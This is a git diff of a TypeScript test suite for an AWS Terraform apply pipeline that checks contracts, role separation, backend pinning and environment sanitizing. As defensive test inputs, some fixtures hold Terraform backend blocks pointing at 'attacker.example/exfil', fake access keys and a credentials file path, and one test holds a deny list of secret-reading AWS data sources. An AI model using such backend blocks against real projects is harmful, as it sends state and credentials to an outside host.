@@ -12,6 +12,7 @@ import { qualificationEvidenceProblems } from "../src/apply/evidence.js";
 import { attestedClientId, checkApplyIdentities, verifyIdentityTargets } from "../src/apply/identities.js";
 import { providerSpec } from "../src/apply/provider.js";
 import { AWS } from "../src/apply/providers/aws.js";
+import { BACKEND_OVERRIDE_FILE } from "../src/apply/backend-pin.js";
 import { openNonceStore } from "../src/apply/nonces.js";
 import { loadSealedPlan, reviewBundleOf } from "../src/apply/seal.js";
 import { APPLY_ADAPTER, APPLY_INIT_ARGV } from "../src/apply/terraform.js";
@@ -23,9 +24,10 @@ import { buildChildEnvironment } from "../src/tools/child-env.js";
 import { TERRAFORM_APPLY_PROFILE } from "../src/tools/profiles.js";
 import { SOURCE_COMMIT,
   AWS_DEV_TARGET, AWS_PROD_TARGET, AWS_QA_TARGET, AWS_REGION, ENGINE_VERSION, NOW, POLICY, awsContractJson, awsIdentityEnv, awsRoleArn, awsTargetOf,
-  behave as behaveIn, callsOf, human, installFakeTerraform, keys, pinPathOf, sha, testFixtureForgeQualificationEvidence, writePinnedContract, writeProject,
+  behave as behaveIn, callsOf, human, installFakeTerraform, keys, sha, testFixtureForgeQualificationEvidence, writeReviewedContract, writeProject,
   approvalFor as approval, type Behavior, type Call, type Project,
-} from "./helpers/apply-fixtures.js";
+  REQUESTER,
+  requesterArgs, CANARY_AWS, withPlannedCanary } from "./helpers/apply-fixtures.js";
 
 // docs/act-pilot-apply.md, "Providers". The AWS spec mirrors the Azure denial matrix. The engine is a fake executable, so
 // these tests pin logic, NOT real-engine behavior or real AWS behavior. Explicit fixtures only: every account id, bucket and role is fake.
@@ -73,10 +75,10 @@ test("the AWS target fields and backend accept the documented shapes and refuse 
 
 const writeContract = (contract: unknown): string => {
   const path = join(fresh("contract"), "act-pilot-contract.json");
-  writePinnedContract(path, contract);
+  writeReviewedContract(path, contract);
   return path;
 };
-const loaded = (contract: unknown) => { const path = writeContract(contract); return loadPilotContract(path, pinPathOf(path)); };
+const loaded = (contract: unknown) => { const path = writeContract(contract); return loadPilotContract(path); };
 const editTargets = (edit: (targets: Record<string, Record<string, unknown>>) => void) => {
   const contract = awsContractJson(KILL) as { targets: Record<string, Record<string, unknown>> };
   edit(contract.targets);
@@ -90,6 +92,7 @@ test("ACT-DEV-1 accepts only an explicit AWS Terraform DEV pilot without fictiti
   devOnly.targets = { DEV: devOnly.targets.DEV };
   devOnly.requiredApprovals = { DEV: 1 };
   devOnly.approvers = devOnly.approvers.map((item: any) => ({ ...item, environments: ["DEV"] }));
+  devOnly.authorize = { DEV: ["APPLY", "CLEANUP"] };
   const contract = loaded(devOnly);
   assert.equal(contract.enabled, true);
   if (!contract.enabled) return;
@@ -111,9 +114,12 @@ test("ACT-DEV-1 accepts only an explicit AWS Terraform DEV pilot without fictiti
   assert.equal(loaded(missing).enabled, false, "DEV target is mandatory");
   const missingDevApprover = { ...devOnly, approvers: devOnly.approvers.map((item: any) => ({ ...item, environments: ["QA"] })) };
   assert.equal(loaded(missingDevApprover).enabled, false, "at least one DEV approver is required");
+  // The DEV-only scope is one rule for every implemented path (test/apply-contract.test.ts), but each path keeps its own target
+  // shape: an AWS Terraform DEV target is neither an Azure target nor a CDK one.
   for (const combination of [{ provider: "AZURE", engine: "TERRAFORM" }, { provider: "AWS", engine: "CDK" }]) {
-    const changed = { ...devOnly, ...combination };
-    assert.equal(loaded(changed).enabled, false, "DEV-only authority cannot expand beyond AWS Terraform");
+    const changed = loaded({ ...devOnly, ...combination });
+    assert.equal(changed.enabled, false, JSON.stringify(combination));
+    assert.match((changed as { reason: string }).reason, /targets\.DEV/);
   }
   const approvals = { ...devOnly, requiredApprovals: { DEV: 0 } };
   assert.equal(loaded(approvals).enabled, false, "DEV approval remains required");
@@ -123,7 +129,7 @@ test("an AWS contract loads; DEV, QA and PROD differ pairwise in account and bac
   const good = loaded(awsContractJson(KILL)) as PilotContract;
   assert.equal(good.enabled, true);
   assert.equal(good.provider, "AWS");
-  assert.deepEqual(good.targets.PROD, { accountId: "333333333333", region: AWS_REGION, backend: AWS_PROD_TARGET.backend, workspace: "default" });
+  assert.deepEqual(good.targets.PROD, { accountId: "333333333333", region: AWS_REGION, backend: AWS_PROD_TARGET.backend, workspace: "default", canary: CANARY_AWS });
   assert.deepEqual(good.requiredApprovals, { DEV: 1, QA: 1, PROD: 2 });
   const reason = (contract: unknown): string => { const l = loaded(contract); assert.equal(l.enabled, false); return (l as { reason: string }).reason; };
   assert.match(reason(editTargets((t) => { t.QA.accountId = t.DEV.accountId; })), /DEV and QA share an account/);
@@ -284,12 +290,12 @@ function world(contract: unknown = awsContractJson(KILL)): World {
   behave({ applyAdvance: true });
   const dirs = { scratch: fresh("scratch"), evidence: fresh("evidence"), nonces: fresh("nonces") };
   const contractPath = join(fresh("contract"), "act-pilot-contract.json");
-  writePinnedContract(contractPath, contract);
+  writeReviewedContract(contractPath, contract);
   return {
     dirs, contractPath,
     deps: {
       sourceCommit: SOURCE_COMMIT,
-      contractPath, contractPinPath: pinPathOf(contractPath), qualificationDir: vaultDir, evidenceDir: dirs.evidence, nonces: openNonceStore(dirs.nonces),
+      contractPath, qualificationDir: vaultDir, evidenceDir: dirs.evidence, nonces: openNonceStore(dirs.nonces),
       env: awsIdentityEnv("DEV"), now: () => NOW, scratchParent: dirs.scratch, toolDirs: [toolDir], killPollMs: 40, killGraceMs: 400,
     },
   };
@@ -299,8 +305,10 @@ const SHARED_TF = 'resource "aws_s3_bucket" "pilot" {}\n';
 
 async function seal(w: World, environment: ApplyEnvironment, mainTf = SHARED_TF) {
   const target = awsTargetOf(environment);
+  // Owner decision E1: the contract's canary allowlist names exactly what the plan the fake shows creates.
+  withPlannedCanary(w.contractPath, toolDir);
   const p = writeProject(fresh("project"), target, mainTf);
-  const result = await sealPreview({ invocation: human(target), environment, target, manifest: p.manifest, projectRoot: p.projectRoot, policyVersion: POLICY, resolved: p.resolved }, forEnv(w, environment));
+  const result = await sealPreview({ invocation: human(target), environment, target, manifest: p.manifest, projectRoot: p.projectRoot, policyVersion: POLICY, resolved: p.resolved, requester: REQUESTER }, forEnv(w, environment));
   assert.ok(result.ok, JSON.stringify(result));
   const loadedPlan = await loadSealedPlan(result.path);
   assert.ok(loadedPlan.ok);
@@ -319,7 +327,7 @@ const refused = (result: { ok: boolean }, code: string) => {
 const sealRefusal = async (w: World, environment: ApplyEnvironment, deps: ApplyDeps = forEnv(w, environment), mainTf = SHARED_TF) => {
   const target = awsTargetOf(environment);
   const p = writeProject(fresh("project"), target, mainTf);
-  return sealPreview({ invocation: human(target), environment, target, manifest: p.manifest, projectRoot: p.projectRoot, policyVersion: POLICY, resolved: p.resolved }, deps);
+  return sealPreview({ invocation: human(target), environment, target, manifest: p.manifest, projectRoot: p.projectRoot, policyVersion: POLICY, resolved: p.resolved, requester: REQUESTER }, deps);
 };
 /** A refusal before the approvals were consumed leaves nothing spent: no apply ran, and the same approvals work once the cause is fixed. */
 async function nothingSpent(w: World, s: Sealed, approvals: SignedApproval[]): Promise<void> {
@@ -344,9 +352,12 @@ test("DEV, then QA, then PROD: each stage seals and applies with the right role 
     assert.deepEqual(result.evidence.target, target);
 
     const steps = calls().slice(before);
-    assert.deepEqual(steps.map((c) => c.args[0]), ["version", "init", "workspace", "state", "show", "apply", "state", "state"], "the last state read is the blueprint of what the run left");
+    assert.deepEqual(steps.map((c) => c.args[0]), ["version", "init", "version", "workspace", "state", "show", "apply", "state", "state"], "the last state read is the blueprint of what the run left");
     assert.deepEqual(steps[1].args, [...APPLY_INIT_ARGV]);
     const roleOf = (c: Call) => c.env.AWS_ROLE_ARN;
+    // The post-init read of what init selected (review of #327, round 5) holds no identity; the steps below are the run's own.
+    assert.deepEqual([steps[2].args, roleOf(steps[2])], [["version", "-json"], undefined]);
+    steps.splice(2, 1);
     assert.equal(roleOf(steps[0]), undefined, "version needs no credentials");
     assert.equal(roleOf(steps[1]), awsRoleArn("STATE_WRITE", environment), "init uses STATE_WRITE");
     assert.equal(roleOf(steps[2]), awsRoleArn("STATE_WRITE", environment));
@@ -523,26 +534,253 @@ test("a provider block that names another account, role, credential, file, desti
   }
   for (const [label, showProviderConfig] of fine) {
     const w = world();
-    behave({ showProviderConfig, applyAdvance: true });
+    // A plan with no aws block plans no aws resource: it creates one random_id instead, so it has something its allowlist names.
+    const created = showProviderConfig.aws ? {} : { showResources: [{ address: "random_id.suffix", type: "random_id", change: { actions: ["create"], before: null, after: {} } }] };
+    behave({ showProviderConfig, ...created, applyAdvance: true });
     const s = await seal(w, "DEV");
     assert.ok((await run(w, s, approvalsFor(s))).ok, label);
   }
 });
 
-test("the project's backend block is judged before init: any attribute beyond bucket, key, region and use_lockfile is refused and no init runs", async () => {
-  const [bucket, ...key] = AWS_DEV_TARGET.backend.split("/");
-  const backend = (body: string) => `terraform {\n  backend "s3" {\n    bucket = "${bucket}"\n    key = "${key.join("/")}"\n    region = "${AWS_REGION}"\n    use_lockfile = true\n${body}\n  }\n}\n` + SHARED_TF;
+test("Terraform's built-in provider is allowed for terraform_data resources only (docs/act-pilot-simulation-aws.md): the exact provider_config entry 1.16.4 emits seals and applies with a terraform_data resource; a terraform_remote_state data source (configured in the root module or a nested one, read into the prior state, or planned), an unknown built-in type and a built-in data source are refused at seal and at apply with PROVIDER_BUILTIN_TYPE_NOT_IN_CONTRACT, whether the plan names the provider or not", async () => {
+  const BUILTIN_NAME = "terraform.io/builtin/terraform";
+  // Exactly what Terraform 1.16.4 emits for a project with a terraform_data resource: no expressions key.
+  const BUILTIN = { terraform: { name: "terraform", full_name: BUILTIN_NAME } };
+  const CODE = "PROVIDER_BUILTIN_TYPE_NOT_IN_CONTRACT";
+  const change = (address: string, type: string, mode = "managed", provider_name: string | null | undefined = BUILTIN_NAME) =>
+    ({ address, mode, type, ...(provider_name === undefined ? {} : { provider_name }), change: { actions: ["create"], before: null, after: {} } });
+  const configured = (address: string, type: string, mode: string, provider_config_key = "terraform") => ({ address, mode, type, provider_config_key });
+  const pilot = { showResources: [change("terraform_data.pilot", "terraform_data")], showConfigurationExtra: { root_module: { resources: [configured("terraform_data.pilot", "terraform_data", "managed")] } } };
+  const fine: Array<[string, Behavior]> = [
+    ["terraform_data beside a matching aws block", { ...pilot, showProviderConfig: { ...BUILTIN, aws: { ...AWS_PROVIDER, expressions: { allowed_account_ids: { constant_value: [AWS_DEV_TARGET.account] } } } } }],
+    ["terraform_data alone, with the built-in provider as the only one", { ...pilot, showProviderConfig: BUILTIN, showOnlyConfigured: true }],
+    ["terraform_data planned and in the prior state too", { ...pilot, showProviderConfig: BUILTIN, showDocumentExtra: {
+      prior_state: { values: { root_module: { resources: [{ address: "terraform_data.pilot", mode: "managed", type: "terraform_data", provider_name: BUILTIN_NAME }] } } },
+      planned_values: { root_module: { resources: [{ address: "terraform_data.pilot", mode: "managed", type: "terraform_data", provider_name: BUILTIN_NAME }] } },
+    } }],
+  ];
+  const refusing: Array<[string, Behavior]> = [
+    ["a terraform_remote_state data source configured in the root module (as 1.16.4 lists one whose read failed: nowhere else)", { ...pilot, showProviderConfig: BUILTIN,
+      showConfigurationExtra: { root_module: { resources: [configured("terraform_data.pilot", "terraform_data", "managed"), configured("data.terraform_remote_state.other", "terraform_remote_state", "data")] } } }],
+    ["a terraform_remote_state data source configured in a nested module, under a provider key with no block", { ...pilot, showProviderConfig: BUILTIN,
+      showConfigurationExtra: { root_module: { module_calls: { net: { source: "./net", module: { resources: [configured("module.net.data.terraform_remote_state.x", "terraform_remote_state", "data", "module.net:terraform")] } } } } } }],
+    ["a terraform_remote_state data source read into the prior state of a child module", { ...pilot, showProviderConfig: BUILTIN,
+      showDocumentExtra: { prior_state: { values: { root_module: { child_modules: [{ address: "module.net", resources: [{ address: "module.net.data.terraform_remote_state.x", mode: "data", type: "terraform_remote_state", provider_name: BUILTIN_NAME }] }] } } } } }],
+    ["a terraform_remote_state data source in the planned values", { ...pilot, showProviderConfig: BUILTIN,
+      showDocumentExtra: { planned_values: { root_module: { resources: [{ address: "data.terraform_remote_state.x", mode: "data", type: "terraform_remote_state", provider_name: BUILTIN_NAME }] } } } }],
+    ["a terraform_remote_state data source with no provider named anywhere", { showProviderConfig: BUILTIN, showConfigurationExtra: { root_module: { resources: [{ address: "data.terraform_remote_state.x", mode: "data", type: "terraform_remote_state" }] } } }],
+    ["an unknown built-in type among the changes", { showProviderConfig: BUILTIN, showResources: [change("terraform_future.x", "terraform_future")] }],
+    ["an unknown built-in type with no provider named", { showProviderConfig: BUILTIN, showResources: [change("terraform_future.x", "terraform_future", "managed", undefined)] }],
+    ["a data source of the built-in provider, even of the allowed type", { showProviderConfig: BUILTIN, showDocumentExtra: { planned_values: { root_module: { resources: [{ address: "data.terraform_data.x", mode: "data", type: "terraform_data", provider_name: BUILTIN_NAME }] } } } }],
+    ["a built-in type reported under a lookalike registry name", { showProviderConfig: BUILTIN, showResources: [change("terraform_remote_state.x", "terraform_remote_state", "managed", "registry.terraform.io/hashicorp/terraform")] }],
+  ];
+  for (const [label, behavior] of fine) {
+    const w = world();
+    behave({ ...behavior, applyAdvance: true });
+    const s = await seal(w, "DEV");
+    assert.ok((await run(w, s, approvalsFor(s))).ok, label);
+  }
+  for (const [label, behavior] of refusing) {
+    const w = world();
+    behave(behavior);
+    const atSeal = await sealRefusal(w, "DEV");
+    refused(atSeal, "ARTIFACT_INVALID");
+    assert.match((atSeal as { message: string }).message, new RegExp(CODE), label);
+    // Applying: the plan is shown again, and what it shows is judged again.
+    behave({});
+    const s = await seal(w, "DEV");
+    const approvals = approvalsFor(s);
+    behave(behavior);
+    const result = await run(w, s, approvals);
+    refused(result, "TARGET_NOT_IN_CONTRACT");
+    assert.match((result as { message: string }).message, new RegExp(CODE), label);
+    await nothingSpent(w, s, approvals);
+  }
+  // Review N2 of #320: a use whose provider the plan does not name is refused, even of the allowed type (Terraform always names it).
+  {
+    const w = world();
+    behave({ showProviderConfig: BUILTIN, showResources: [change("terraform_data.pilot", "terraform_data", "managed", null)] });
+    const atSeal = await sealRefusal(w, "DEV");
+    refused(atSeal, "ARTIFACT_INVALID");
+    assert.match((atSeal as { message: string }).message, /PROVIDER_CONFIG_NOT_IN_CONTRACT/);
+  }
+});
+
+test("review N3 of #305, the AWS equivalents: data sources that mint a token or read a secret are refused at seal and at apply (PROVIDER_DATA_SOURCE_NOT_IN_CONTRACT); the same names as managed resources, and ordinary data sources, are not", async () => {
+  const AWS_NAME = "registry.terraform.io/hashicorp/aws";
+  const CODE = "PROVIDER_DATA_SOURCE_NOT_IN_CONTRACT";
+  const env = awsIdentityEnv("DEV");
+  const pinned = { accountId: AWS_DEV_TARGET.account, region: AWS_REGION, backend: AWS_DEV_TARGET.backend, workspace: "default" };
+  const judge = (uses: { address: string; mode: string; type: string }[]): string => {
+    try { AWS.assertProviderConfig([AWS_PROVIDER], pinned, env, uses.map((u) => ({ ...u, provider: { name: "aws", full_name: AWS_NAME } }))); return "OK"; } catch (error) { return (error as Error).message; }
+  };
+  const SECRET = [
+    "aws_ecr_authorization_token", "aws_ecrpublic_authorization_token", "aws_eks_cluster_auth", "aws_codeartifact_authorization_token",
+    "aws_secretsmanager_secret_version", "aws_secretsmanager_random_password", "aws_ssm_parameter", "aws_ssm_parameters_by_path",
+    "aws_kms_secrets", "aws_kms_secret", "aws_cognito_user_pool_client",
+  ];
+  for (const type of SECRET) {
+    assert.equal(judge([{ address: "data." + type + ".x", mode: "data", type }]), CODE, type);
+    assert.equal(judge([{ address: "module.app.data." + type + ".x", mode: "managed", type }]), CODE, type + " under a data address");
+    assert.equal(judge([{ address: type + ".x", mode: "", type }]), CODE, type + " with no mode");
+  }
+  for (const type of ["aws_ssm_parameter", "aws_secretsmanager_secret_version", "aws_cognito_user_pool_client"]) assert.equal(judge([{ address: type + ".x", mode: "managed", type }]), "OK", type + " as a resource");
+  assert.equal(judge([{ address: "data.aws_caller_identity.me", mode: "data", type: "aws_caller_identity" }, { address: "data.aws_region.r", mode: "data", type: "aws_region" }]), "OK");
+  // Through the driver: refused at seal, and again at apply when the plan is shown and judged again; nothing is spent.
+  const behavior: Behavior = { showProviderConfig: { aws: AWS_PROVIDER }, showConfigurationExtra: { root_module: { resources: [{ address: "data.aws_ecr_authorization_token.t", mode: "data", type: "aws_ecr_authorization_token", provider_config_key: "aws" }] } } };
   const w = world();
-  assert.ok((await sealRefusal(w, "DEV", undefined, backend(""))).ok, "exactly the contract's settings are fine");
-  for (const body of [
-    '    endpoints = {\n      sts = "https://attacker.example"\n      s3 = "https://attacker.example"\n    }', '    access_key = "AKIAFAKEFAKEFAKE0000"\n    secret_key = "fake"',
-    '    profile = "operator"', '    shared_credentials_files = ["/home/operator/.aws/credentials"]', '    skip_credentials_validation = true',
+  behave(behavior);
+  const atSeal = await sealRefusal(w, "DEV");
+  refused(atSeal, "ARTIFACT_INVALID");
+  assert.match((atSeal as { message: string }).message, new RegExp(CODE));
+  behave({});
+  const s = await seal(w, "DEV");
+  const approvals = approvalsFor(s);
+  behave(behavior);
+  const result = await run(w, s, approvals);
+  refused(result, "TARGET_NOT_IN_CONTRACT");
+  assert.match((result as { message: string }).message, new RegExp(CODE));
+  await nothingSpent(w, s, approvals);
+});
+
+test("the built-in provider walker fails closed (#279 review B1, N1): a tree nested to depth 64 is judged normally and one at depth 65 is PROVIDER_PLAN_TOO_DEEP, in the configuration and in the prior state, at seal and at apply; and a tree that is present but malformed (a root module that is not an object, resources as an object, child_modules that is not a list, a module call that is not an object, a changes entry that is not an object) is PROVIDER_PLAN_UNREADABLE, never skipped", async () => {
+  const BUILTIN_NAME = "terraform.io/builtin/terraform";
+  const BUILTIN = { terraform: { name: "terraform", full_name: BUILTIN_NAME } };
+  const resource = (type: string, mode: string) => ({ address: "module.deep." + (mode === "data" ? "data." : "") + type + ".x", mode, type, provider_config_key: "module.deep:terraform", provider_name: BUILTIN_NAME });
+  /** A configuration tree whose innermost module, `depth` calls below the root, holds the resource (depth 0 is the root module itself). */
+  const configurationAt = (depth: number, leaf: object): Record<string, unknown> => {
+    let module: Record<string, unknown> = { resources: [leaf] };
+    for (let level = 0; level < depth; level++) module = { module_calls: { deep: { source: "./deep", module } } };
+    return { root_module: module };
+  };
+  /** A values tree (prior state or planned values) whose innermost child module, `depth` levels below the root, holds the resource. */
+  const valuesAt = (depth: number, leaf: object): Record<string, unknown> => {
+    let module: Record<string, unknown> = { address: "module.deep", resources: [leaf] };
+    for (let level = 0; level < depth; level++) module = { address: "module.deep", child_modules: [module] };
+    return { root_module: module };
+  };
+  const DEEP = "PROVIDER_PLAN_TOO_DEEP", UNREADABLE = "PROVIDER_PLAN_UNREADABLE", BUILTIN_CODE = "PROVIDER_BUILTIN_TYPE_NOT_IN_CONTRACT";
+  const judged = (code: string, behavior: Behavior): [string, Behavior] => [code, { showProviderConfig: BUILTIN, ...behavior }];
+  const refusing: Array<[string, Behavior]> = [
+    // Depth 64: still read, so a remote state there is refused for what it is, and a terraform_data there passes (below).
+    judged(BUILTIN_CODE, { showConfigurationExtra: configurationAt(64, resource("terraform_remote_state", "data")) }),
+    judged(BUILTIN_CODE, { showDocumentExtra: { prior_state: { values: valuesAt(64, resource("terraform_remote_state", "data")) } } }),
+    // Depth 65: not read; refused as too deep whatever it holds, even an allowed type, in each tree.
+    judged(DEEP, { showConfigurationExtra: configurationAt(65, resource("terraform_remote_state", "data")) }),
+    judged(DEEP, { showConfigurationExtra: configurationAt(65, resource("terraform_data", "managed")) }),
+    judged(DEEP, { showDocumentExtra: { prior_state: { values: valuesAt(65, resource("terraform_remote_state", "data")) } } }),
+    judged(DEEP, { showDocumentExtra: { prior_state: { values: valuesAt(65, resource("terraform_data", "managed")) } } }),
+    judged(DEEP, { showDocumentExtra: { planned_values: valuesAt(65, resource("terraform_data", "managed")) } }),
+    // Malformed trees: present but not the documented shape.
+    judged(UNREADABLE, { showConfigurationExtra: { root_module: "not an object" } }),
+    judged(UNREADABLE, { showConfigurationExtra: { root_module: { resources: { x: resource("terraform_data", "managed") } } } }),
+    judged(UNREADABLE, { showConfigurationExtra: { root_module: { module_calls: { deep: "not an object" } } } }),
+    judged(UNREADABLE, { showConfigurationExtra: { root_module: { module_calls: ["not an object"] } } }),
+    judged(UNREADABLE, { showConfigurationExtra: { root_module: { resources: ["not an object"] } } }),
+    judged(UNREADABLE, { showDocumentExtra: { prior_state: { values: { root_module: { child_modules: { x: 1 } } } } } }),
+    judged(UNREADABLE, { showDocumentExtra: { prior_state: { values: { root_module: [] } } } }),
+    judged(UNREADABLE, { showDocumentExtra: { planned_values: { root_module: { resources: "x" } } } }),
+    judged(UNREADABLE, { showOnlyConfigured: true, showResources: ["not an object"] }),
+  ];
+  for (const [code, behavior] of refusing) {
+    const w = world();
+    behave(behavior);
+    const atSeal = await sealRefusal(w, "DEV");
+    refused(atSeal, "ARTIFACT_INVALID");
+    assert.match((atSeal as { message: string }).message, new RegExp(code), JSON.stringify(behavior).slice(0, 160));
+    behave({});
+    const s = await seal(w, "DEV");
+    const approvals = approvalsFor(s);
+    behave(behavior);
+    const result = await run(w, s, approvals);
+    assert.equal(result.ok, false);
+    assert.match((result as { message: string }).message, new RegExp(code), JSON.stringify(behavior).slice(0, 160));
+    await nothingSpent(w, s, approvals);
+  }
+  // Depth 64 with the allowed type seals and applies, in both trees.
+  for (const behavior of [
+    { showConfigurationExtra: configurationAt(64, resource("terraform_data", "managed")) },
+    { showDocumentExtra: { prior_state: { values: valuesAt(64, resource("terraform_data", "managed")) }, planned_values: valuesAt(64, resource("terraform_data", "managed")) } },
   ]) {
+    const w = world();
+    // The plan creates the module's terraform_data (owner decision E1: a plan that creates nothing has no allowlist to match).
+    behave({ showProviderConfig: BUILTIN, ...behavior, showResources: [{ address: "module.deep.terraform_data.x", mode: "managed", type: "terraform_data", provider_name: BUILTIN_NAME, change: { actions: ["create"], before: null, after: {} } }], applyAdvance: true });
+    const s = await seal(w, "DEV");
+    assert.ok((await run(w, s, approvalsFor(s))).ok, JSON.stringify(behavior).slice(0, 120));
+  }
+});
+
+/** The contract's DEV target as the provider spec reads it. */
+const AWS_DEV_TARGET_PINNED = { accountId: AWS_DEV_TARGET.account, region: AWS_REGION, backend: AWS_DEV_TARGET.backend, workspace: "default" };
+
+test("the backend is pinned: whatever backend, cloud or state_store block the project has, init sees only the product override and the contract's location", async () => {
+  const w = world();
+  for (const mainTf of [
+    SHARED_TF,
+    'terraform {\n  backend "s3" {\n    endpoints = { s3 = "https://attacker.example" }\n    access_key = "AKIAFAKEFAKEFAKE0000"\n  }\n}\n' + SHARED_TF,
+    'terraform {\n  backend "http" {\n    address = "https://attacker.example/exfil"\n  }\n}\n' + SHARED_TF,
+    'terraform {\n  cloud {\n    hostname = "attacker.example"\n  }\n}\n' + SHARED_TF,
+  ]) {
+    behave({ applyAdvance: true });
+    const s = await seal(w, "DEV", mainTf);
+    const inits = calls().filter((c) => c.args[0] === "init");
+    assert.equal(inits.length, 1);
+    assert.deepEqual(inits[0].args, [...APPLY_INIT_ARGV], "every init reads the product's backend file");
+    assert.equal(inits[0].backendOverride, 'terraform {\n  backend "s3" {}\n}\n', "the fake engine sees the product override");
+    assert.equal(inits[0].workEntries?.filter((name) => /override\.tf(\.json)?$/i.test(name)).join(), BACKEND_OVERRIDE_FILE, "exactly one override file");
+    assert.equal(inits[0].backendConfig, AWS.backendLocation(AWS_DEV_TARGET_PINNED), "the seal's settings are the contract's location and nothing of the project's");
+    assert.ok(calls().every((c) => c.env.TF_DATA_DIR === ".terraform"), "every step uses init's own fresh data directory");
+    behave({ applyAdvance: true });
+    assert.ok((await run(w, s, approvalsFor(s))).ok);
+    const applyInit = calls().find((c) => c.args[0] === "init");
+    assert.equal(applyInit?.backendOverride, 'terraform {\n  backend "s3" {}\n}\n', "the apply's init is pinned too");
+    assert.ok(applyInit?.backendConfig?.startsWith(AWS.backendLocation(AWS_DEV_TARGET_PINNED)));
+  }
+});
+
+test("an override file in the project is refused by name before any engine step runs", async () => {
+  const w = world();
+  const sealWith = async (extra: (root: string) => void) => {
+    const target = awsTargetOf("DEV");
+    const root = fresh("project");
+    extra(root);
+    const p = writeProject(root, target, SHARED_TF);
+    return sealPreview({ invocation: human(target), environment: "DEV", target, manifest: p.manifest, projectRoot: p.projectRoot, policyVersion: POLICY, resolved: p.resolved, requester: REQUESTER }, forEnv(w, "DEV"));
+  };
+  for (const [name, code] of [
+    ["override.tf", "BACKEND_OVERRIDE_NOT_ALLOWED"], ["backend_override.tf", "BACKEND_OVERRIDE_NOT_ALLOWED"], ["main_override.tf.json", "BACKEND_OVERRIDE_NOT_ALLOWED"],
+    ["Override.TF", "BACKEND_OVERRIDE_NOT_ALLOWED"], ["zzzz_alz_backend_override.tf", "BACKEND_OVERRIDE_NOT_ALLOWED"],
+  ] as const) {
     behave();
-    const result = await sealRefusal(w, "DEV", undefined, backend(body));
+    const result = await sealWith((root) => writeFileSync(join(root, name), 'terraform {\n  backend "http" {\n    address = "https://attacker.example"\n  }\n}\n'));
     refused(result, "ARTIFACT_INVALID");
-    assert.match((result as { message: string }).message, /BACKEND_BLOCK_NOT_IN_CONTRACT/);
-    assert.deepEqual(calls().map((c) => c.args[0]), ["version"], "init never ran, so no credential was sent anywhere");
+    assert.match((result as { message: string }).message, new RegExp(code), name);
+    assert.deepEqual(calls(), [], name + ": no engine step ran, so nothing was contacted");
+  }
+  // Saved state never even reaches the snapshot (captureProjectFiles refuses it); the engine's own name check is the second layer (test/apply-backend-pin.test.ts).
+  const stateful = fresh("project");
+  writeFileSync(join(stateful, "terraform.tfstate"), "{}");
+  assert.throws(() => writeProject(stateful, awsTargetOf("DEV"), SHARED_TF), /STATE_OR_PLAN_FILE/);
+});
+
+test("an init that exits non-zero stops the seal: no plan, no show, nothing stored", async () => {
+  const w = world();
+  behave({ failOn: "init" });
+  const result = await sealRefusal(w, "DEV");
+  refused(result, "ARTIFACT_INVALID");
+  assert.deepEqual(calls().map((c) => c.args[0]), ["version", "init"]);
+});
+
+test("the sanitized Terraform child environment: no TF_CLI_ARGS*, TF_WORKSPACE, user TF_CLI_CONFIG_FILE or user TF_DATA_DIR reaches it; TF_DATA_DIR is always the product's", () => {
+  const base: NodeJS.ProcessEnv = {
+    ...awsIdentityEnv("DEV"), TF_CLI_ARGS: "-reconfigure", TF_CLI_ARGS_init: "-migrate-state", TF_WORKSPACE: "evil", TF_DATA_DIR: "/tmp/evil", TF_CLI_CONFIG_FILE: "/tmp/evil.tfrc",
+  };
+  for (const identity of ["STATE", "STATE_WRITE", "APPLY", "DISCOVERY"] as const) {
+    for (const name of ["TF_CLI_ARGS", "TF_CLI_ARGS_init", "TF_WORKSPACE", "TF_DATA_DIR", "TF_CLI_CONFIG_FILE"]) base["ALZ_" + identity + "_" + name] = "/tmp/evil";
+    const child = buildChildEnvironment({ profile: TERRAFORM_APPLY_PROFILE, base, toolDirs: ["/usr/bin"], home: "/h", tmp: "/t", identity });
+    assert.deepEqual(Object.keys(child.env).filter((key) => key.startsWith("TF_")).sort(), ["TF_DATA_DIR", "TF_IN_AUTOMATION"], identity);
+    assert.equal(child.env.TF_DATA_DIR, ".terraform");
+    for (const name of ["TF_CLI_ARGS", "TF_CLI_ARGS_init", "TF_WORKSPACE", "TF_DATA_DIR", "TF_CLI_CONFIG_FILE"]) assert.ok(child.refused.includes("ALZ_" + identity + "_" + name), identity + " " + name);
   }
 });
 
@@ -558,20 +796,20 @@ test("the identity checks also refuse the other cloud's credentials, a role spel
   assert.deepEqual(checkApplyIdentities(env("DEV", { ALZ_APPLY_AWS_ROLE_ARN: awsRoleArn("APPLY", "DEV").replace("role/", "role/ci/") }), AWS, APPLY_IDENTITIES), { ok: true }, "a path alone is not a collision with another name");
 });
 
-test("a sealed plan applies only under the pinned contract it was sealed under; the evidence names that contract", async () => {
+test("a sealed plan applies only under the reviewed contract it was sealed under; the evidence names that contract", async () => {
   const w = world();
   const s = await seal(w, "DEV");
-  const pinned = loadPilotContract(w.contractPath, pinPathOf(w.contractPath)) as PilotContract;
+  const pinned = loadPilotContract(w.contractPath) as PilotContract;
   assert.equal(s.sealed.contractSha256, pilotContractSha256(pinned));
   assert.equal(reviewBundleOf(s.sealed).contractSha256, s.sealed.contractSha256, "the approvers' bundle carries it");
   // Re-pinned with the same account and backend but another region: every other gate would pass against the new contract.
   const other = awsContractJson(KILL) as { targets: Record<string, Record<string, unknown>> };
   other.targets.DEV.region = "eu-west-2";
-  writePinnedContract(w.contractPath, other);
+  writeReviewedContract(w.contractPath, other);
   const approvals = approvalsFor(s);
   refused(await run(w, s, approvals, {}, { ...forEnv(w, "DEV"), env: env("DEV", { ALZ_APPLY_AWS_REGION: "eu-west-2", ALZ_STATE_WRITE_AWS_REGION: "eu-west-2" }) }), "ARTIFACT_INVALID");
   assert.equal(applyCalls().length, 0);
-  writePinnedContract(w.contractPath, awsContractJson(KILL));
+  writeReviewedContract(w.contractPath, awsContractJson(KILL));
   const result = await run(w, s, approvals);
   assert.ok(result.ok, JSON.stringify(result));
   assert.equal(result.evidence.contractSha256, s.sealed.contractSha256);
@@ -619,7 +857,7 @@ test("qualification evidence binds the DEV account, region, backend, workspace, 
   assert.deepEqual(qualificationEvidenceProblems(qualification(), AWS), []);
 });
 
-// --- the CLI: the pinned contract names the provider ----------------------------------------------
+// --- the CLI: the reviewed contract names the provider ----------------------------------------------
 
 type Terminal = NonNullable<ApplyCliDeps["terminal"]> & { out: string[] };
 const terminal = (answers: string[]): Terminal => {
@@ -631,7 +869,7 @@ const json = (value: unknown): string => { const path = join(fresh("file"), "fil
 test("./alz apply qualify, seal, approve and apply work for an AWS contract with no provider flag, and the attestation names the role ARNs", async () => {
